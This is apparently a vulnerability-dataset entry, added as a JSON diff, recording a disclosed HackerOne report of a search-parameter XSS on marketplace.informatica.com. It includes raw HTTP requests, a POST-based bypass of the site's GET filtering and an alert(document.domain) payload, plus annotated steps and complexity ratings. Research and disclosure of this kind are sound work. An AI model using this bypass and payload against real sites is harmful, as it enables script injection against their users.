@@ -1,0 +1,42 @@
+{
+  "reported_to": "Informatica",
+  "reported_by": "s_p_q_r ",
+  "title": "[marketplace.informatica.com] Search XSS",
+  "content": "\nThe search query parameter is put into Javascript to set the localStorage item:\nhttps://marketplace.informatica.com/search-solr.jspa?q=%foo%\nCode 44 Bytes\n1localStorage.setItem(\"searchTerm\", \"%foo%\");\nAttempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:\nCode 195 Bytes\n1GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1\n2Host: marketplace.informatica.com\n3\n4HTTP/1.0 302 Found\n5Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee\nHowever it turns out the search param can be successfully submitted via POST \u2014 the following request popups an alert:\nCode 103 Bytes\n1POST /search-solr.jspa HTTP/1.1\n2Host: marketplace.informatica.com\n3\n4q=%22-alert%28document.domain%29-%22\nPoC:\nhttp://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9\nTested with latest Firefox and Chrome.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1495440480,
+  "report_url": "https://hackerone.com/reports/200034",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to /search-solr.jspa with a malicious payload in the 'q' parameter, e.g., q=%22-alert%28document.domain%29-%22"
+    ],
+    [
+      2,
+      "Observe that the payload is executed as JavaScript when the search term is stored in localStorage"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Cross-Site Scripting (XSS) issue in the search functionality of marketplace.informatica.com. The search query parameter is directly inserted into JavaScript to set a localStorage item without proper sanitization. While GET requests are sanitized via redirection, POST requests bypass this protection, allowing arbitrary JavaScript execution.",
+  "reason": "The attack involves only a single component (the search parameter) and a straightforward bypass of GET sanitization by using POST instead. The interaction between GET and POST handling is subtle but not highly complex, and the XSS vector is a common pattern.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability is triggered via a POST request with a malicious payload in the 'q' parameter, which is not subject to the same filtering as GET requests. This is a client-side injection issue that doesn't involve authentication or authorization boundaries, but rather input validation and output encoding flaws.",
+    "is_detectable": false
+  }
+}
